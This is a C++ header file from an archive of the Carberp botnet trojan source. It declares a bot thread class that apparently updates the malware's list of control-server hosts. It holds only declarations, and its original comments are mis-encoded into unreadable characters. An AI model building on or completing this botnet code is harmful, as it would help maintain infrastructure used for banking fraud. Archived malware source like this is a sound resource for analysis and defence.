/*
  name      Carberp Botnet
  type      trojan
  cve       —
  year      unknown
  os        Windows
  authors   unknown
  source    krisyotam
  archived  krisyotam (2026)
  notes     —
 */
//---------------------------------------------------------------------------
//  ������ �������������� ������� ������
//---------------------------------------------------------------------------

#ifndef HostsAutoUpdateH
#define HostsAutoUpdateH
//---------------------------------------------------------------------------


#include "BotClasses.h"
#include "Strings.h"

//**************************************************************
//  THostsUpdater - ����� ��������������� ���������� ������
//**************************************************************
class THostsUpdater : public TBotThread
{
private:
	void Update(DWORD &UpdateInterval);
	void SaveHosts(const string &Buf);
protected:
    void DoExecute();
public:
	DWORD Interval;

	THostsUpdater();
	~THostsUpdater();
};

// ������� ��������� �������������� ���������� ������
void StartHostsUpdater();

//---------------------------------------------------------------------------
#endif
